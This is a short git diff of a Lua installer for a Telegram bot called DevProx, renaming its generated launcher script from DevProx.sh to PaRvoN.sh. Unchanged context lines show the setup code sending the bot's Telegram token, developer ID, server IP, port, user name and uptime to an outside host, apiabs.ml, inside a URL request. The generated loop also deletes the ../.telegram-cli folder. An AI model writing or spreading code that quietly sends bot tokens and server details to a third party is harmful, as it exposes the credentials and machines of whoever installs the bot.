@@ -83,7 +83,7 @@ SudoIds = {DevAbs:get(ServerDevProx.."IdDevProx")},
 }
 Create(Config, "./config.lua")   
 https.request("https://apiabs.ml/config.php?Get=DevProx&DevId="..DevAbs:get(ServerDevProx.."IdDevProx").."&TokenBot="..DevAbs:get(ServerDevProx.."TokenDevProx").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
-file = io.open("DevProx.sh", "w")  
+file = io.open("PaRvoN.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/DevProx
@@ -113,7 +113,7 @@ cd $HOME/DevProx
 while(true) do
 rm -fr ../.telegram-cli
 screen -S DevProx -X kill
-screen -S DevProx ./DevProx.sh
+screen -S DevProx ./PaRvoN.sh
 done
 ]]) 
 file:close() 
